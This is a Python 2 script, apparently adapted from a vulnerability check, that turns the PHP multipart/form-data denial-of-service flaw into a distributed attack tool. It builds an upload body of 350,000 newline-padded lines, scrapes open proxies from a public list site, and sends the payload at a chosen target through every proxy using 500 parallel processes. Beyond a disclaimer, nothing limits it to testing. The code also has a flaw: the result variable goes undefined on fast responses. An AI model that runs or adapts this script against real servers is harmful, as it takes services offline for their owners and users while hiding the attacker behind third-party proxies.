'''
Author: Shusheng Liu,The Department of Security Cloud, Baidu
email: liusscs@163.com

Multiprocessing and proxy
Author: typcn
Welcome to http://blog.eqoe.cn

WARNING: USE THIS TOOL AT YOUR OWN RISK
注意：此工具造成的任何后果由使用者自行承担
去掉此段注释以运行脚本,Remove this comment to run script

'''
import sys
import urllib,urllib2
import datetime
import re
import os
import threading
import time
import random   
from optparse import OptionParser
from multiprocessing import Pool

def check_php_multipartform_dos(url,post_body,headers,ip):
    proxy_handler = urllib2.ProxyHandler({"http" : ip})
    null_proxy_handler = urllib2.ProxyHandler({})
    opener = urllib2.build_opener(proxy_handler)
    urllib2.install_opener(opener)
    req = urllib2.Request(url)
    for key in headers.keys():
        req.add_header(key,headers[key])
    starttime = datetime.datetime.now();
    fd = urllib2.urlopen(req,post_body)
    html = fd.read()
    endtime = datetime.datetime.now()
    usetime=(endtime - starttime).seconds
    if(usetime > 5):
        result = url+" is vulnerable";
    else:
        if(usetime > 3):
            result = "need to check normal respond time"
    return [result,usetime]
#end

def get_stock_html(URL):
        opener = urllib2.build_opener(
                urllib2.HTTPRedirectHandler(),
                urllib2.HTTPHandler(debuglevel=0),
                )
        opener.addheaders = [
                ('User-agent',
                 'Mozilla/4.0 (compatible;MSIE 7.0;'
                 'Windows NT 5.1; .NET CLR 2.0.50727;'
                 '.NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)')
                 ]
        url = "http://proxy.com.ru/%s"%URL
        response = opener.open(url)
        return ''.join(response.readlines())

def Getting_Url():
        global CC_Url
        file = open('url','r')
        CC_Url = file.readlines()
        file.close()

def Getting_list():
        global IP_Port
        IP_Port = []
        for html_list in re.findall('list_\d+.html',get_stock_html("list_1.html")):
                print "getting %s's IP:PORT"%html_list
                IP_Port += eval(re.sub('</td><td>',':',"%s"%re.findall('\d+.\d+.\d+.\d+<\/td><td>\d+',get_stock_html(html_list))))

def main():
    parser = OptionParser()
    parser.add_option("-t", "--target", action="store", 
                  dest="target", 
                  default=False, 
          type="string",
                  help="test target")
    (options, args) = parser.parse_args()
    target = options.target

    Num=350000
    headers={'Content-Type':'multipart/form-data; boundary=----WebKitFormBoundaryX3B7rDMPcQlzmJE1',
            'Accept-Encoding':'gzip, deflate',
            'User-Agent':'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.111 Safari/537.36'}
    body = "------WebKitFormBoundaryX3B7rDMPcQlzmJE1\nContent-Disposition: form-data; name=\"file\"; filename=sp.jpg.webp"
    payload=""
    for i in range(0,Num):
        payload = payload + "a\n"
    body = body + payload;
    body = body + "Content-Type: application/octet-stream\r\n\r\ndatadata\r\n------WebKitFormBoundaryX3B7rDMPcQlzmJE1--"
    print "starting...";
    Getting_list()
    pool = Pool(500)
    for ip in IP_Port:
        pool.apply_async(check_php_multipartform_dos, [target,body,headers,ip])
    pool.close()
    pool.join()

if __name__=="__main__":
    main()